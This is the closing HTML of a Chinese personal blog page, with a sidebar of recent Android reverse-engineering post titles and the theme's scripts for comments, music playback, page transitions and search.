data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/v2-dbadb26e707dabf6723061583f9967b4_720w.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Magisk学习简介"/></a><div class="content"><a class="title" href="/850e6e3/" title="Magisk学习简介">Magisk学习简介</a><time datetime="2025-05-12T16:00:00.000Z" title="发表于 2025-05-13 00:00:00">2025-05-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/6a5921fa/" title="记录Frida spawn模式hook失败的问题(禁用usap)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/v2-dbadb26e707dabf6723061583f9967b4_720w.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记录Frida spawn模式hook失败的问题(禁用usap)"/></a><div class="content"><a class="title" href="/6a5921fa/" title="记录Frida spawn模式hook失败的问题(禁用usap)">记录Frida spawn模式hook失败的问题(禁用usap)</a><time datetime="2025-05-11T16:00:00.000Z" title="发表于 2025-05-12 00:00:00">2025-05-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/efdb165f/" title="记录一次安装Frida14.2.18的坑和解决方法"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/v2-dbadb26e707dabf6723061583f9967b4_720w.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记录一次安装Frida14.2.18的坑和解决方法"/></a><div class="content"><a class="title" href="/efdb165f/" title="记录一次安装Frida14.2.18的坑和解决方法">记录一次安装Frida14.2.18的坑和解决方法</a><time datetime="2025-05-10T16:00:00.000Z" title="发表于 2025-05-11 00:00:00">2025-05-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/1610ef8a/" title="Android逆向18-Unicorn"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/v2-dbadb26e707dabf6723061583f9967b4_720w.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Android逆向18-Unicorn"/></a><div class="content"><a class="title" href="/1610ef8a/" title="Android逆向18-Unicorn">Android逆向18-Unicorn</a><time datetime="2025-05-09T16:00:00.000Z" title="发表于 2025-05-10 00:00:00">2025-05-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/c2ef4741/" title="Android逆向17-抓包进阶"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/v2-dbadb26e707dabf6723061583f9967b4_720w.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Android逆向17-抓包进阶"/></a><div class="content"><a class="title" href="/c2ef4741/" title="Android逆向17-抓包进阶">Android逆向17-抓包进阶</a><time datetime="2025-05-08T16:00:00.000Z" title="发表于 2025-05-09 00:00:00">2025-05-09</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Matriy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><p><a style="margin-inline:5px"target="_blank" href="https://hexo.io/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为 Hexo" alt="HEXO"></a><a style="margin-inline:5px"target="_blank" href="https://butterfly.js.org/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用 Butterfly" alt="Butterfly"></a><a style="margin-inline:5px"target="_blank" href="https://www.jsdelivr.com/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用 Jsdelivr 为静态资源提供CDN加速" alt="Jsdelivr"></a><a style="margin-inline:5px"target="_blank" href="https://github.com/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由 GitHub 托管" alt="GitHub"></a><a style="margin-inline:5px"target="_blank"href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" alt="img" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p> <p>Hi, welcome to Matriy's <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">簡</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikoo.open-ctf.top/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const init = (el = document, path = location.pathname) => {
+    twikoo.init({
+      el: el.querySelector('#twikoo-wrap'),
+      envId: 'https://twikoo.open-ctf.top/',
+      region: '',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      },
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    GLOBAL_CONFIG_SITE.pageType === 'post' && getCount()
+
+    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
+      if (el.children.length) {
+        el.innerHTML = ''
+        el.classList.add('no-comment')
+      }
+    })
+  }
+
+  const loadTwikoo = (el, path) => {
+    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
+    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(() => init(el, path))
+  }
+
+  if (isShuoshuo) {
+    'Twikoo' === 'Twikoo'
+      ? window.shuoshuoComment = { loadComment: loadTwikoo }
+      : window.loadOtherComment = loadTwikoo
+    return
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><script async data-pjax src="/js/anzhiyu.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"]):not([href="/music/"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      pjax.loadUrl('/404.html')
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
